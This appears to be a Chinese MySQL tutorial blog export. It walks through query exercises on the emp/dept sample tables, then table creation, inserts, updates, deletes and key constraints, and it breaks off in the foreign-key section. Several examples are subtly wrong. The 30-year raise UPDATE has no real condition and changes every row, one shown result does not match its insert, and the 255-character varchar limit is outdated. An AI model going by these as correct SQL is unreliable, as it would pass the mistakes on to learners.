1987-04-19 | 3000.00 |    NULL |     20 |<br>| ACCOUNTING |  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>| SALES      |  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>| RESEARCH   |  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>| SALES      |  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>| RESEARCH   |  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>| ACCOUNTING |  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>| OPERATIONS |  NULL | NULL   | NULL      | NULL | NULL       |    NULL |    NULL |   NULL |<br>+————+——-+——–+———–+——+————+———+———+——–+</p>
<h1 id="17、列出至少有5给员工的所有部门"><a href="#17、列出至少有5给员工的所有部门" class="headerlink" title="17、列出至少有5给员工的所有部门"></a>17、列出至少有5给员工的所有部门</h1><pre><code>mysql&gt; select count(*),d.dname from emp e join dept d on e.deptno = d.deptno group by d.dname having count(*)&gt;=5;</code></pre><p>+———-+———-+<br>| count(*) | dname    |<br>+———-+———-+<br>|        5 | RESEARCH |<br>|        6 | SALES    |<br>+———-+———-+</p>
<h1 id="18、列出薪金比“SMITH”多的所有员工信息"><a href="#18、列出薪金比“SMITH”多的所有员工信息" class="headerlink" title="18、列出薪金比“SMITH”多的所有员工信息"></a>18、列出薪金比“SMITH”多的所有员工信息</h1><pre><code>select * from emp where sal&gt;(select sal from emp where ename=&apos;smith&apos;);</code></pre><p>+——-+——–+———–+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———–+——+————+———+———+——–+<br>|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>+——-+——–+———–+——+————+———+———+——–+</p>
<h1 id="19、列出所有“CLERK”（办事员）的姓名及其部门名称，部门的人数。"><a href="#19、列出所有“CLERK”（办事员）的姓名及其部门名称，部门的人数。" class="headerlink" title="19、列出所有“CLERK”（办事员）的姓名及其部门名称，部门的人数。"></a>19、列出所有“CLERK”（办事员）的姓名及其部门名称，部门的人数。</h1><p><em>第一步，列出所有“CLERK”的人员</em></p>
<pre><code>select e.ename,e.job,d.dname from emp e join dept d on d.deptno = e.deptno where e.job=&apos;CLERK&apos;;</code></pre><p>+——–+——-+————+<br>| ename  | job   | dname      |<br>+——–+——-+————+<br>| SMITH  | CLERK | RESEARCH   |<br>| ADAMS  | CLERK | RESEARCH   |<br>| JAMES  | CLERK | SALES      |<br>| MILLER | CLERK | ACCOUNTING |<br>+——–+——-+————+</p>
<p><em>第二步，找出每个部门的部门人数作为t2表，上表作为t1表进行内连接</em></p>
<pre><code>select count(*), d.dname from emp e join dept d on e.deptno = d.deptno group by d.dname;</code></pre><p>+———-+————+<br>| count(*) | dname      |<br>+———-+————+<br>|        3 | ACCOUNTING |<br>|        5 | RESEARCH   |<br>|        6 | SALES      |<br>+———-+————+</p>
<p><em>第三步，自连接t1和t2表</em></p>
<pre><code>select t1.ename,t1.dname,t2.count from (select e.ename,e.job,d.dname from emp e join dept d on d.deptno = e.deptno where e.job=&apos;CLERK&apos;) t1 join (select count(*) count, d.dname from emp e join dept d on e.deptno = d.deptno group by d.dname) t2 on t1.dname = t2.dname;</code></pre><p>+——–+————+——-+<br>| ename  | dname      | count |<br>+——–+————+——-+<br>| SMITH  | RESEARCH   |     5 |<br>| ADAMS  | RESEARCH   |     5 |<br>| JAMES  | SALES      |     6 |<br>| MILLER | ACCOUNTING |     3 |<br>+——–+————+——-+</p>
<h1 id="20、列出最低薪金大于1500的各种工作及从事此工作的全部雇员人数。"><a href="#20、列出最低薪金大于1500的各种工作及从事此工作的全部雇员人数。" class="headerlink" title="20、列出最低薪金大于1500的各种工作及从事此工作的全部雇员人数。"></a>20、列出最低薪金大于1500的各种工作及从事此工作的全部雇员人数。</h1><p><em>按照工作岗位分组求最小值。</em></p>
<pre><code>select job, count(*) from emp group by job having min(sal)&gt;1500;</code></pre><p>+———–+———-+<br>| job       | count(*) |<br>+———–+———-+<br>| ANALYST   |        2 |<br>| MANAGER   |        3 |<br>| PRESIDENT |        1 |<br>+———–+———-+</p>
<h1 id="21、列出在部门“SALES”-销售部-工作的员工的姓名，假定不知道销售部的部门编号。"><a href="#21、列出在部门“SALES”-销售部-工作的员工的姓名，假定不知道销售部的部门编号。" class="headerlink" title="21、列出在部门“SALES”(销售部)工作的员工的姓名，假定不知道销售部的部门编号。"></a>21、列出在部门“SALES”(销售部)工作的员工的姓名，假定不知道销售部的部门编号。</h1><pre><code>select deptno from dept where dname=&apos;SALES&apos;;</code></pre><p>+——–+<br>| deptno |<br>+——–+<br>|     30 |<br>+——–+<br>        select ename from emp where deptno =(select deptno from dept where dname=’SALES’);<br>+——–+<br>| ename  |<br>+——–+<br>| ALLEN  |<br>| WARD   |<br>| MARTIN |<br>| BLAKE  |<br>| TURNER |<br>| JAMES  |<br>+——–+</p>
<h1 id="22、列出薪金高于公司平均薪金的所有员工，所在部门，上级领导，雇员的工资等级。"><a href="#22、列出薪金高于公司平均薪金的所有员工，所在部门，上级领导，雇员的工资等级。" class="headerlink" title="22、列出薪金高于公司平均薪金的所有员工，所在部门，上级领导，雇员的工资等级。"></a>22、列出薪金高于公司平均薪金的所有员工，所在部门，上级领导，雇员的工资等级。</h1><p><em>第一步，列出薪金高于公司平均薪资的所有员工</em></p>
<pre><code>select e.* from emp e where sal&gt;(select avg(sal) avgsal from emp);</code></pre><p>+——-+——-+———–+——+————+———+——+——–+<br>| EMPNO | ENAME | JOB       | MGR  | HIREDATE   | SAL     | COMM | DEPTNO |<br>+——-+——-+———–+——+————+———+——+——–+<br>|  7566 | JONES | MANAGER   | 7839 | 1981-04-02 | 2975.00 | NULL |     20 |<br>|  7698 | BLAKE | MANAGER   | 7839 | 1981-05-01 | 2850.00 | NULL |     30 |<br>|  7782 | CLARK | MANAGER   | 7839 | 1981-06-09 | 2450.00 | NULL |     10 |<br>|  7788 | SCOTT | ANALYST   | 7566 | 1987-04-19 | 3000.00 | NULL |     20 |<br>|  7839 | KING  | PRESIDENT | NULL | 1981-11-17 | 5000.00 | NULL |     10 |<br>|  7902 | FORD  | ANALYST   | 7566 | 1981-12-03 | 3000.00 | NULL |     20 |<br>+——-+——-+———–+——+————+———+——+——–+</p>
<p><em>第二步，列出所在部门，上级领导，薪资等级</em></p>
<pre><code>select d.dname 部门,t2.ename 上级领导, t1.ename 员工姓名,s.grade from (select e.* from emp e where sal&gt;(select avg(sal) avgsal from emp)) t1 left join dept d on t1.deptno = d.deptno left join (select e.* from emp e where sal&gt;(select avg(sal) avgsal from emp)) t2 on t1.mgr=t2.empno left join salgrade s on t1.sal between losal and hisal;</code></pre><p>+————+———-+———-+——-+<br>| 部门       | 上级领导 | 员工姓名 | grade |<br>+————+———-+———-+——-+<br>| ACCOUNTING | KING     | CLARK    |     4 |<br>| RESEARCH   | KING     | JONES    |     4 |<br>| RESEARCH   | JONES    | SCOTT    |     4 |<br>| RESEARCH   | JONES    | FORD     |     4 |<br>| SALES      | KING     | BLAKE    |     4 |<br>| ACCOUNTING | NULL     | KING     |     5 |<br>+————+———-+———-+——-+</p>
<h1 id="23、列出各个部门的MANAGER（领导）最低薪金"><a href="#23、列出各个部门的MANAGER（领导）最低薪金" class="headerlink" title="23、列出各个部门的MANAGER（领导）最低薪金"></a>23、列出各个部门的MANAGER（领导）最低薪金</h1><pre><code>select min(sal),deptno from emp where job=&apos;MANAGER&apos; group by deptno;</code></pre><p>+———-+——–+<br>| min(sal) | deptno |<br>+———-+——–+<br>|  2450.00 |     10 |<br>|  2975.00 |     20 |<br>|  2850.00 |     30 |<br>+———-+——–+</p>
<h1 id="24、列出所有员工的年工资，按年薪从低到高排序"><a href="#24、列出所有员工的年工资，按年薪从低到高排序" class="headerlink" title="24、列出所有员工的年工资，按年薪从低到高排序"></a>24、列出所有员工的年工资，按年薪从低到高排序</h1><pre><code>select ename, (sal+ifnull(comm,0))*12 yearsal from emp order by yearsal;</code></pre><p>+——–+———-+<br>| ename  | yearsal  |<br>+——–+———-+<br>| SMITH  |  9600.00 |<br>| JAMES  | 11400.00 |<br>| ADAMS  | 13200.00 |<br>| MILLER | 15600.00 |<br>| TURNER | 18000.00 |<br>| WARD   | 21000.00 |<br>| ALLEN  | 22800.00 |<br>| CLARK  | 29400.00 |<br>| MARTIN | 31800.00 |<br>| BLAKE  | 34200.00 |<br>| JONES  | 35700.00 |<br>| SCOTT  | 36000.00 |<br>| FORD   | 36000.00 |<br>| KING   | 60000.00 |<br>+——–+———-+</p>
<h1 id="25、求出员工领导的薪水超过3000的员工名称与领导名称"><a href="#25、求出员工领导的薪水超过3000的员工名称与领导名称" class="headerlink" title="25、求出员工领导的薪水超过3000的员工名称与领导名称"></a>25、求出员工领导的薪水超过3000的员工名称与领导名称</h1><pre><code>select a.ename, b.ename from emp a join emp b on a.mgr = b.empno where b.sal&gt;3000;</code></pre><p>+——-+——-+<br>| ename | ename |<br>+——-+——-+<br>| JONES | KING  |<br>| BLAKE | KING  |<br>| CLARK | KING  |<br>+——-+——-+</p>
<h1 id="26、求出部门名称中，带‘S’字符的部门员工的工资合计、部门人数"><a href="#26、求出部门名称中，带‘S’字符的部门员工的工资合计、部门人数" class="headerlink" title="26、求出部门名称中，带‘S’字符的部门员工的工资合计、部门人数"></a>26、求出部门名称中，带‘S’字符的部门员工的工资合计、部门人数</h1><pre><code>select d.dname, ifnull(sum(e.sal),&apos; &apos;),count(e.ename) from emp e right join (select * from dept where dname like &apos;%s%&apos;) d on e.deptno = d.deptno group by d.dname;</code></pre><p>+————+————————+—————-+<br>| DNAME      | ifnull(sum(e.sal),’ ‘) | count(e.ename) |<br>+————+————————+—————-+<br>| OPERATIONS |                        |              0 |<br>| RESEARCH   | 10875.00               |              5 |<br>| SALES      | 9400.00                |              6 |<br>+————+————————+—————-+</p>
<h1 id="27、给任职日期超过30年的员工加薪10"><a href="#27、给任职日期超过30年的员工加薪10" class="headerlink" title="27、给任职日期超过30年的员工加薪10%"></a>27、给任职日期超过30年的员工加薪10%</h1><pre><code>update emp set sal = sal * 1.1 where timestampdiff(year,hiredate,now());</code></pre><p>Query OK, 14 rows affected (0.02 sec)<br>Rows matched: 14  Changed: 14  Warnings: 0</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>MYSQL表的使用</title>
    <url>/posts/12.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h1><blockquote>
<p>建表句的语法根式：<br><strong>create table 表名(字段名1 数据类型, 字段明2 数据类型, 字段名3 数据类型, …);</strong></p>
</blockquote>
<blockquote>
<p>关于MYSQL当中字段的数据类型？<br>常见：<br><strong>int（整数型）（java中的int）</strong><br><strong>bigint（长整型）（java中的long）</strong><br><strong>float（浮点型）（java中的float double）</strong><br><strong>char（定长长字符串）（string）</strong><br><strong>varchar（可变长字符串最多255个）（StringBuffer、StringBuilder）</strong><br><strong>date（日期类型）（对应java中的java.sql.date类型）</strong><br><strong>BLOB（Binary Large OBject 二进制大对象，如存储图片、视频等流媒体信息）（对应java中的object）</strong><br><strong>CLOB（Character Large OBject 存储较大文本，比如，可以存储4G的字符串。）（对应java中的object）</strong></p>
</blockquote>
<p><strong>char和varchar怎么选择</strong></p>
<p>　　<strong>在实际的开发中，当某个字段中的数据长度不发生改变的时候，是定长的，例如：性别、生日等都采用char。</strong></p>
<p>　　<strong>当一个字段的数据长度不确定，例如：简介、姓名等都是采用varchar。</strong></p>
<blockquote>
<p><strong>BLOB和CLOB类型的使用？</strong><br>　　<strong>电影表：t_movie</strong><br>　　<strong>id(int) 　　name(varchar)　　playtime(date/char)　　poster(BLOB)　　history(CLOB)</strong></p>
<p>————————————————————————————————————————————<br>　　1　　　<br>　　2<br>　　3</p>
</blockquote>
<p>表名在数据库当中一般建议以： t＿或者tbl＿开始</p>
<p>创建学生表：<br>　　学生信息包括：<br>　　　　学号、姓名、性别、班级编号、生日<br>　　　　学号：bigint<br>　　　　姓名：varchar<br>　　　　性别：char<br>　　　　班级编号：int<br>　　　　生日：char</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">create table t_student(</span><br><span class="line">	no bigint,</span><br><span class="line">	name varchar(255),</span><br><span class="line">	sex char(1),</span><br><span class="line">	classno varchar(255),</span><br><span class="line">	birth char(10)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<h1 id="insert语句查询数据"><a href="#insert语句查询数据" class="headerlink" title="insert语句查询数据"></a>insert语句查询数据</h1><p>  <strong>语法格式：</strong><br>    <strong>insert into 表名(字段名1,字段名2,……) values(值1,……)</strong><br>    要求：<strong>字段的数量和值的数量相同，并且数据类型要对应相同。</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">insert into t_student(no,name,sex,classno,birth) values(&#39;2&#39;,&#39;lisi&#39;,&#39;1&#39;,&#39;高三&#39;,&#39;2001-12-29&#39;);</span><br><span class="line">mysql&gt; select * from t_student;</span><br></pre></td></tr></table></figure></div>

<p>+——+———-+——+———+————+<br>| no   | name     | sex  | classno | birth      |<br>+——+———-+——+———+————+<br>|    1 | zhangsan | 1    | 高三    | 2001-12-29 |<br>+——+———-+——+———+————+<br>1 row in set (0.00 sec)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">insert into t_student(name) values(&#39;wangwu&#39;);&#x2F;&#x2F;除name字段之外，剩下的所有字段自动插入NULL。</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from t_student;</span><br></pre></td></tr></table></figure></div>
<p>+——+———-+——+———+————+<br>| no   | name     | sex  | classno | birth      |<br>+——+———-+——+———+————+<br>|    1 | zhangsan | 1    | 高三    | 2001-12-29 |<br>|    2 | lisi     | 1    | 高三    | 2001-12-29 |<br>| NULL | wangwu   | NULL | NULL    | NULL       |<br>+——+———-+——+———+————+</p>
<pre><code>insert into t_student(no) values(&apos;3&apos;);</code></pre><p>mysql&gt; insert into t_student(no) values(‘3’);<br>Query OK, 1 row affected (0.01 sec)</p>
<p>mysql&gt; select * from t_student;<br>+——+———-+——+———+————+<br>| no   | name     | sex  | classno | birth      |<br>+——+———-+——+———+————+<br>|    1 | zhangsan | 1    | 高三    | 2001-12-29 |<br>|    2 | lisi     | 1    | 高三    | 2001-12-29 |<br>| NULL | wangwu   | NULL | NULL    | NULL       |<br>|    3 | NULL     | NULL | NULL    | NULL       |<br>+——+———-+——+———+————+<br>4 rows in set (0.00 sec)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">drop table if exists t_student;</span><br><span class="line">create table t_student(</span><br><span class="line">	no bigint,</span><br><span class="line">	name varchar(255),</span><br><span class="line">	sex char(1) default 1,</span><br><span class="line">	classno varchar(255),</span><br><span class="line">	birth char(10)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<pre><code>insert into t_student(name) values(&apos;zhang&apos;);

mysql&gt; insert into t_student(name) values(&apos;zhang&apos;);</code></pre><p>mysql&gt; select * from t_student;<br>+——+——-+——+———+——-+<br>| no   | name  | sex  | classno | birth |<br>+——+——-+——+———+——-+<br>| NULL | zhang | 1    | NULL    | NULL  |<br>+——+——-+——+———+——-+<br>1 row in set (0.00 sec)</p>
<p><strong>需要注意的地方：</strong><br>　　当一条insert语句执行成功之后，表格当中必然会多一行记录。<br>　　即使多的这一行记录当中某些字段是NULL，后期也没有办法在执行insert语句插入数据了<br>　　只能使用update进行更新。</p>
<pre><code>insert into t_student values(1,&apos;jack&apos;,&apos;0&apos;,&apos;gaosan&apos;,&apos;1986-10-23&apos;);

mysql&gt; insert into t_student values(1,&apos;jack&apos;,&apos;0&apos;,&apos;gaosan&apos;,&apos;1986-10-23&apos;);</code></pre><p>Query OK, 1 row affected (0.00 sec)<br>//字段可以省略不写，但是后面的value对数量和顺序都有要求。<br>mysql&gt; select * from t_student;<br>+——+——-+——+———+————+<br>| no   | name  | sex  | classno | birth      |<br>+——+——-+——+———+————+<br>| NULL | zhang | 1    | NULL    | NULL       |<br>|    1 | jack  | 0    | gaosan  | 1986-10-23 |<br>+——+——-+——+———+————+</p>
<pre><code>//一次插入多行数据
insert into t_student
    (no,name,sex,classno,birth) 
values
    (3,&apos;rose&apos;,&apos;1&apos;,&apos;gaosi2&apos;,&apos;2002-02-10&apos;),
    (4,&apos;se&apos;,&apos;0&apos;,&apos;gaosi2&apos;,&apos;2202-02-10&apos;);

mysql&gt; select * from t_student;</code></pre><p>+——+——-+——+———+————+<br>| no   | name  | sex  | classno | birth      |<br>+——+——-+——+———+————+<br>| NULL | zhang | 1    | NULL    | NULL       |<br>|    1 | jack  | 0    | gaosan  | 1986-10-23 |<br>|    3 | rose  | 1    | gaosi2  | 2002-02-10 |<br>|    4 | se    | 0    | gaosi2  | 2202-02-10 |<br>+——+——-+——+———+————+</p>
<h1 id="表的复制"><a href="#表的复制" class="headerlink" title="表的复制"></a>表的复制</h1><pre><code>mysql&gt; create table emp1 as select * from emp;</code></pre><p>Query OK, 14 rows affected (0.05 sec)<br>Records: 14  Duplicates: 0  Warnings: 0</p>
<p>语法：<br>    create table 表名 as select语句;<br>    将查询结果当做表创建出来</p>
<h1 id="将查询结果插入到一张表中"><a href="#将查询结果插入到一张表中" class="headerlink" title="将查询结果插入到一张表中"></a>将查询结果插入到一张表中</h1><pre><code>mysql&gt; insert into dept1 select * from dept;
mysql&gt; select * from dept1;</code></pre><p>+——–+————+———-+<br>| DEPTNO | DNAME      | LOC      |<br>+——–+————+———-+<br>|     10 | ACCOUNTING | NEW YORK |<br>|     20 | RESEARCH   | DALLAS   |<br>|     30 | SALES      | CHICAGO  |<br>|     40 | OPERATIONS | BOSTON   |<br>|     10 | ACCOUNTING | NEW YORK |<br>|     20 | RESEARCH   | DALLAS   |<br>|     30 | SALES      | CHICAGO  |<br>|     40 | OPERATIONS | BOSTON   |<br>+——–+————+———-+<br>8 rows in set (0.00 sec)</p>
<h1 id="修改数据：update"><a href="#修改数据：update" class="headerlink" title="修改数据：update"></a>修改数据：update</h1><p>  语法格式：<br>      update 表名 set 字段名1=值1,字段名2=值2…… where 条件;</p>
<p>注意：没有条件整张表数据全部更新</p>
<p><strong>案例：将部门10的loc修改为shanghai，将部门名称修改为人事部</strong></p>
<pre><code>update dept1 set loc=&apos;shanghai&apos;, dname=&apos;renshibu&apos; where deptno=10;
mysql&gt; update dept1 set loc=&apos;shanghai&apos;, dname=&apos;renshibu&apos; where deptno=10;</code></pre><p>Query OK, 2 rows affected (0.01 sec)<br>Rows matched: 2  Changed: 2  Warnings: 0</p>
<p>mysql&gt; select * from dept1;<br>+——–+————+———-+<br>| DEPTNO | DNAME      | LOC      |<br>+——–+————+———-+<br>|     10 | renshibu   | shanghai |<br>|     20 | RESEARCH   | DALLAS   |<br>|     30 | SALES      | CHICAGO  |<br>|     40 | OPERATIONS | BOSTON   |<br>|     10 | renshibu   | shanghai |<br>|     20 | RESEARCH   | DALLAS   |<br>|     30 | SALES      | CHICAGO  |<br>|     40 | OPERATIONS | BOSTON   |<br>+——–+————+———-+<br>8 rows in set (0.00 sec)</p>
<pre><code>更新所有记录
    update dept1 set loc=&apos;x&apos;, dname=&apos;y&apos;;
    mysql&gt; select * from dept1;</code></pre><p>+——–+——-+——+<br>| DEPTNO | DNAME | LOC  |<br>+——–+——-+——+<br>|     10 | y     | x    |<br>|     20 | y     | x    |<br>|     30 | y     | x    |<br>|     40 | y     | x    |<br>|     10 | y     | x    |<br>|     20 | y     | x    |<br>|     30 | y     | x    |<br>|     40 | y     | x    |<br>+——–+——-+——+</p>
<h1 id="删除数据？"><a href="#删除数据？" class="headerlink" title="删除数据？"></a>删除数据？</h1><p>  语法格式：</p>
<pre><code>delete from 表名 where 条件;</code></pre><p><strong>注意：没有条件全部删除</strong></p>
<p>删除10部门数据？</p>
<pre><code>**delete from dept1 where deptno = 10;**</code></pre><p>删除所有记录？</p>
<pre><code>**delete from dept1;**</code></pre><p>怎么删除大表中的数据？（重点）</p>
<pre><code>truncate table 表名; //表被截断，不可回滚。永久丢失</code></pre><p>删除表？</p>
<pre><code>drop table 表名;//这个通用。
drop table if exists 表名;//oracle不支持这种写法</code></pre><h1 id="对于表结构的修改"><a href="#对于表结构的修改" class="headerlink" title="对于表结构的修改"></a>对于表结构的修改</h1><p>设计好了之后，对表结构的修改是很少的<br>需要修改表结构，我们也可以直接使用工具操作。<br>出现在java代码当中的sql包括：insert delete update select(这些都是表中的数据操作)</p>
<p>增删改查有一个术语： CRUD操作<br>create(增) retrieve（检索） update（改） delete（删除）</p>
<h1 id="约束（constraint）"><a href="#约束（constraint）" class="headerlink" title="约束（constraint）"></a>约束（constraint）</h1><h2 id="什么时约束？常见的约束有哪些呢？"><a href="#什么时约束？常见的约束有哪些呢？" class="headerlink" title="什么时约束？常见的约束有哪些呢？"></a>什么时约束？常见的约束有哪些呢？</h2><pre><code>在创建表的时候，可以给表的字段添加相应的约束，添加约束的目的是为了保证表中数据的
**合法性、有效性、完整性**
常见的约束有哪些？
  非空约束(not null)：约束的字段不能为NULL。
  唯一约束(unique)：约束的字段不能重复
  主键约束(primary key)：约束的字段既不能为NULL，也不能重复（简称PK）
  外键约束(foreign key)：……（简称FK）
  检查约束(check):注意Oracle数据库有check约束，但是mysql没有，目前mysql不支持该约束。</code></pre><h2 id="非空约束-not-null"><a href="#非空约束-not-null" class="headerlink" title="非空约束 not null"></a>非空约束 not null</h2><pre><code>drop table if exists t_user;
create table t_user(
   id int,
   username varchar(255) not null,
   password varchar(255)
 );

insert into t_user(id,password) values(1,&apos;123&apos;);</code></pre><h2 id="唯一性约束（unique）"><a href="#唯一性约束（unique）" class="headerlink" title="唯一性约束（unique）"></a>唯一性约束（unique）</h2><p>  <strong>唯一约束修饰的字段具有唯一性，不能重复。但可以为NULL。</strong><br>  案例：给某一列添加unique</p>
<pre><code>drop table if exists t_user;
create table t_user(
id int,
username varchar(255) unique  //列级约束
);
insert into t_user values(1,&apos;zhangsan&apos;);
insert into t_user(id) values(2);
insert into t_user(id) values(3);
insert into t_user(id) values(4);</code></pre><p>  案例：给两个列或者多个列添加unique</p>
<pre><code>drop table if exists t_user;
create table t_user(
  id int,
  usercode varchar(255),
  username varchar(255),
  unique(usercode,username) //联合添加一个约束 【表级约束】
);
insert into t_user values(1,&apos;111&apos;,&apos;zs&apos;);
insert into t_user values(2,&apos;111&apos;,&apos;ls&apos;);
insert into t_user values(3,&apos;222&apos;,&apos;zs&apos;);
select * from t_user;

drop table if exists t_user;//两个唯一约束
create table t_user(
  id int,
  usercode varchar(255) unique,
  username varchar(255) unique,
);</code></pre><p><strong>注意：not null只有列级约束，没有表级约束</strong></p>
<h2 id="主键约束"><a href="#主键约束" class="headerlink" title="主键约束"></a>主键约束</h2><p>   怎么给一张表添加主键约束呢？</p>
<pre><code>drop table if exists t_user;
create table t_user(
  id int primary key,
  username varchar(255),
  email varchar(255)
 );
 insert into t_user(id,username,email) values(1,&apos;lis&apos;,&apos;lis@123.com&apos;);
 insert into t_user(id,username,email) values(2,&apos;zs&apos;,&apos;zs@123.com&apos;);
 insert into t_user(id,username,email) values(3,&apos;ww&apos;,&apos;ww@123.com&apos;);
 select * from t_user;</code></pre><p>+—-+———-+————-+<br>| id | username | email       |<br>+—-+———-+————-+<br>|  1 | lis      | <a href="mailto:lis@123.com">lis@123.com</a> |<br>|  2 | zs       | <a href="mailto:zs@123.com">zs@123.com</a>  |<br>|  3 | ww       | <a href="mailto:ww@123.com">ww@123.com</a>  |<br>+—-+———-+————-+</p>
<p>mysql&gt; desc t_user;<br>+———-+————–+——+—–+———+——-+<br>| Field    | Type         | Null | Key | Default | Extra |<br>+———-+————–+——+—–+———+——-+<br>| id       | int(11)      | NO   | PRI | NULL    |       |<br>| username | varchar(255) | YES  |     | NULL    |       |<br>| email    | varchar(255) | YES  |     | NULL    |       |<br>+———-+————–+——+—–+———+——-+</p>
<p><strong>·  根据以上的测试得出，id是主键，因为添加了主键约束，主键字段中的数据不能为NULL，也不能重复。</strong><br><strong>·  主键的特点：不能为NULL，也不能重复</strong></p>
<p><strong>· 主键相关的术语</strong></p>
<pre><code>主键约束：primary key
主键字段：id字段添加primary key之后，id称为
主键值：id字段中的每一个值都是主键值</code></pre><p><strong>主键有什么作用</strong><br>　表的设计三范式中有要求，第一范式就要求任何一张表都应该有主键<br>　主键的作用：主键值是这行记录在这张表当中的唯一标识（就像一个人的身份证号一样。）</p>
<p><em>主键的分类？</em><br>　根据主键字段的字段数量来划分：<br>    单一主键（推荐，常用的）<br>    复合主键（多个字段联合起来添加一个主键约束）（复合主键不建议使用，因为复合主键违背三范式）<br>　根据主键性质来划分<br>    自然主键：主键值最好就是一个和业务没有任何关系的自然数（这种方式是推荐的）<br>    业务主键：主键值和系统的业务挂钩，例如：拿着银行卡的卡号做主键，拿着身份证号码作为主键（不推荐用）<br>    <em>最好不要拿着和业务挂钩的字段作为主键。因为以后业务一旦发生改变的时候，主键值可能也需要随着发生变化，但有的时候后没有办法变化，因为变化可能会导致主键值重复。</em></p>
<p><strong>一张表的主键约束只能有一个。（重点）</strong></p>
<p><em>使用表级约束定义主键</em></p>
<pre><code>drop table if exists t_user;
create table t_user(
  id int,
  username varchar(255),
  primary key(id)
 );
 insert into t_user(id,username) values(1,&apos;cs&apos;);
 insert into t_user(id,username) values(2,&apos;as&apos;);
 insert into t_user(id,username) values(3,&apos;w&apos;);
 insert into t_user(id,username) values(4,&apos;s&apos;);
 select * from t_user;</code></pre><p><em>以下内容是演示一下符合主键，不需要掌握</em></p>
<pre><code>drop table if exists t_user;
 create table t_user(
   id int,
   username varchar(255),
   password varchar(255),
   primary key(id,username)
  );
  insert into t_user(id,username) values(1,&apos;cs&apos;);
  insert into t_user(id,username) values(2,&apos;as&apos;);
  insert into t_user(id,username) values(3,&apos;w&apos;);
  insert into t_user(id,username) values(4,&apos;s&apos;);
  select * from t_user;</code></pre><p><em>mysql提供主键值自增：</em></p>
<pre><code>drop table if exists t_user;
create table t_user(
 id int primary key auto_increment, //id字段自动维护一个自增的数字，从1开始，以1递增
 username varchar(255)
 );
 insert into t_user(username) values(&apos;a&apos;);
 insert into t_user(username) values(&apos;b&apos;);
 insert into t_user(username) values(&apos;c&apos;);
 insert into t_user(username) values(&apos;d&apos;);
 insert into t_user(username) values(&apos;e&apos;);
 insert into t_user(username) values(&apos;f&apos;);
 select * from t_user;</code></pre><p><em>提示：oracle当中也提供了一个自增机制，叫做序列（sequence）对象</em></p>
<h2 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h2><p>*　关于外键约束的相关术语*<br>    外键约束：foreign key<br>    外键字段：添加有外键约束的字段<br>    外键值：外键字段中的每一个值。</p>
<p><strong>业务背景：</strong><br>*　请设置数据库表，用来维护学生和班级的信息*</p>
<ul>
<li><p>第一种方案：一张表存储所有数据*<br>缺点：冗余。（不推荐）</p>
</li>
<li><p>第二种方案：两张表（班级表和学生表）*<br>t_class 班级表<br>t_student学生表</p>
<p>   t_student中classno字段引用t_class表中的cno字段，此时t_student表叫做字表。t_class表叫做父表。<br>   删除数据的时候，先删除子表，再删除父表。<br>   添加数据的时候，先添加父表，再添加子表。<br>   创建表的时候，先创建父表，再创建子表。<br>   删除表的时候，先删除子表，再删除父表。</p>
<p>   drop table if exists t_student;<br>   drop table if exists t_class;</p>
<p>   create table t_class(</p>
<pre><code>cno int ,
